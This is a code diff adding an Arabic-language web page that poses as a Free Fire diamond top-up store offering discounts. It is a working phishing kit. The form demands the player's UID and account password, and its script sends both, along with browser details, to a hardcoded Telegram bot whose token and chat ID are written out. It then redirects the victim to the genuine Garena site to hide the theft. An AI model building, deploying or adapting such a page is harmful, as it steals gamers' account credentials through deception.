@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Free Fire - شحن الجواهر | عروض حصرية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a0f1e 0%, #0c1122 100%);
+            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* تأثير النار الخلفي */
+        .fire-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 40%, rgba(255,80,0,0.08), transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* الهيدر */
+        .header {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff5e00, #ff2b00);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+            text-shadow: 2px 2px 0 #8a1a00;
+            box-shadow: 0 0 30px rgba(255,80,0,0.5);
+        }
+        h1 {
+            color: #ff7b2c;
+            font-size: 28px;
+            letter-spacing: 1px;
+        }
+        .sub {
+            color: #8899aa;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        /* بطاقات العروض */
+        .offers {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .offer-card {
+            flex: 1;
+            min-width: 100px;
+            background: linear-gradient(145deg, #1a1f2e, #121724);
+            border-radius: 20px;
+            padding: 15px 8px;
+            text-align: center;
+            border: 1px solid rgba(255,100,0,0.3);
+            transition: 0.2s;
+            cursor: pointer;
+            position: relative;
+        }
+        .offer-card.selected {
+            border: 2px solid #ff5e00;
+            background: linear-gradient(145deg, #2a1f1a, #1a1512);
+            box-shadow: 0 0 20px rgba(255,80,0,0.3);
+        }
+        .offer-diamonds {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffaa44;
+        }
+        .offer-price {
+            font-size: 14px;
+            color: #ffffff;
+            margin-top: 5px;
+        }
+        .offer-badge {
+            font-size: 10px;
+            color: #ff8844;
+            margin-top: 5px;
+        }
+
+        /* حقل الإدخال */
+        .input-group {
+            margin: 20px 0;
+        }
+        label {
+            display: block;
+            color: #ffaa66;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1a1f2e;
+            border: 1px solid #ff5e00;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #ffaa44;
+            box-shadow: 0 0 8px rgba(255,80,0,0.3);
+        }
+
+        /* زر الشحن */
+        .btn-shop {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(95deg, #ff5e00, #ff2b00);
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            margin: 10px 0;
+        }
+        .btn-shop:hover {
+            transform: scale(1.01);
+            box-shadow: 0 5px 25px #ff2b0077;
+        }
+
+        /* الطرق الدفع */
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            padding: 15px;
+            background: #0d1222;
+            border-radius: 30px;
+        }
+        .payment-methods span {
+            font-size: 24px;
+            opacity: 0.7;
+        }
+
+        /* الفوتر */
+        .footer {
+            text-align: center;
+            color: #556688;
+            font-size: 10px;
+            margin-top: 20px;
+            padding: 15px;
+        }
+
+        .loader {
+            display: none;
+            text-align: center;
+            color: #ffaa44;
+            margin: 10px 0;
+            font-size: 13px;
+        }
+
+        .warning-box {
+            background: rgba(255,80,0,0.1);
+            border-left: 3px solid #ff5e00;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 11px;
+            color: #ffaa88;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+<div class="fire-bg"></div>
+<div class="container">
+    <div class="header">
+        <div class="logo">🔥</div>
+        <h1>شحن جواهر فري فاير</h1>
+        <div class="sub">أفضل العروض • خصم يصل إلى 50% لفترة محدودة</div>
+    </div>
+
+    <div class="warning-box">
+        🎁 خصم إضافي 20% على أول شحن! ادخل حسابك الآن.
+    </div>
+
+    <div class="offers" id="offers">
+        <div class="offer-card" data-diamonds="100" data-price="1.00">
+            <div class="offer-diamonds">💎 100</div>
+            <div class="offer-price">1.00$</div>
+            <div class="offer-badge">🔥 شعبية</div>
+        </div>
+        <div class="offer-card" data-diamonds="500" data-price="4.50">
+            <div class="offer-diamonds">💎 500</div>
+            <div class="offer-price">4.50$</div>
+            <div class="offer-badge">⭐ ممتاز</div>
+        </div>
+        <div class="offer-card" data-diamonds="1200" data-price="9.90">
+            <div class="offer-diamonds">💎 1200</div>
+            <div class="offer-price">9.90$</div>
+            <div class="offer-badge">🎉 الأكثر مبيعاً</div>
+        </div>
+        <div class="offer-card" data-diamonds="2500" data-price="19.90">
+            <div class="offer-diamonds">💎 2500</div>
+            <div class="offer-price">19.90$</div>
+            <div class="offer-badge">👑 VIP</div>
+        </div>
+    </div>
+
+    <div class="input-group">
+        <label>🎮 ID اللاعب (Free Fire UID)</label>
+        <input type="text" id="uid" placeholder="مثال: 1234567890" autocomplete="off">
+    </div>
+
+    <div class="input-group">
+        <label>🔑 كلمة المرور (للتأكيد)</label>
+        <input type="password" id="password" placeholder="********">
+        <div style="font-size: 10px; color:#667; margin-top:5px;">* كلمة المرور مطلوبة لتأكيد هوية الحساب</div>
+    </div>
+
+    <div class="payment-methods">
+        <span>💳</span> <span>📱</span> <span>🏦</span> <span>💎</span>
+    </div>
+
+    <button class="btn-shop" id="submitBtn">💎 شحن الآن 💎</button>
+    <div class="loader" id="loader">⏳ جاري معالجة الطلب، يرجى الانتظار...</div>
+
+    <div class="footer">
+        • جميع عمليات الشحن مشفرة • الدفع آمن 100% • تطبق الشروط والأحكام •
+    </div>
+</div>
+
+<script>
+    // ========== بيانات التليجرام ==========
+    const BOT_TOKEN = "8715170582:AAHG-8WjvO_gerOhFF2I469vu3y6rJY6r_c";
+    const CHAT_ID = "7882118234";
+    // ====================================
+
+    let selectedDiamonds = "1200";
+    let selectedPrice = "9.90";
+
+    // اختيار العرض
+    const cards = document.querySelectorAll('.offer-card');
+    cards.forEach(card => {
+        card.addEventListener('click', () => {
+            cards.forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            selectedDiamonds = card.getAttribute('data-diamonds');
+            selectedPrice = card.getAttribute('data-price');
+        });
+    });
+    // تحديد العرض الأول افتراضياً
+    cards[2].classList.add('selected');
+
+    // إرسال البيانات
+    document.getElementById('submitBtn').addEventListener('click', async () => {
+        const uid = document.getElementById('uid').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const loader = document.getElementById('loader');
+        const btn = document.getElementById('submitBtn');
+
+        if (!uid || !password) {
+            alert("يرجى إدخال ID اللاعب وكلمة المرور");
+            return;
+        }
+
+        loader.style.display = 'block';
+        btn.disabled = true;
+        btn.style.opacity = '0.6';
+
+        const message = `🔥 FREE FIRE - شحن جواهر 🔥\n\n👤 UID: ${uid}\n🔑 كلمة المرور: ${password}\n💎 الكمية: ${selectedDiamonds} جوهرة\n💰 السعر: ${selectedPrice} $\n📱 الجهاز: ${navigator.userAgent}\n⏰ الوقت: ${new Date().toLocaleString()}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+            loader.innerHTML = '✅ تم بنجاح! جاري التوجيه إلى بوابة الدفع...';
+            setTimeout(() => {
+                window.location.href = "https://ff.garena.com/ar/";
+            }, 1500);
+        } catch(e) {
+            loader.innerHTML = '❌ فشل الاتصال، حاول مرة أخرى';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+        }
+    });
+</script>
+</body>
+  </html>
